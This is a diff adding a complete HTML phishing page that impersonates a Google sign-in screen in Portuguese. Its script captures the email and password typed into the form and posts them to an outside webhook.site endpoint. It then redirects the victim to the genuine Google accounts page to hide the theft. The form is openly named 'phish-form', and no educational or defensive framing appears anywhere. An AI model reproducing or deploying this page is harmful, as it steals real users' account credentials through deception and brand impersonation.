@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Login do Google</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    form {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+    }
+    input {
+      margin-bottom: 10px;
+      display: block;
+      width: 100%;
+      padding: 8px;
+    }
+  </style>
+</head>
+<body>
+  <form id="phish-form">
+    <h2>Fazer login com Google</h2>
+    <input type="email" name="email" placeholder="Email" required />
+    <input type="password" name="senha" placeholder="Senha" required />
+    <button type="submit">Entrar</button>
+  </form>
+
+  <script>
+    document.getElementById("phish-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      fetch("https://webhook.site/f646599d-7bac-4074-8483-c4fa3d54713e", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          email: document.querySelector('input[name="email"]').value,
+          senha: document.querySelector('input[name="senha"]').value
+        })
+      }).then(() => {
+        // Redireciona após "login"
+        window.location.href = "https://accounts.google.com/";
+      });
+    });
+  </script>
+</body>
+</html>
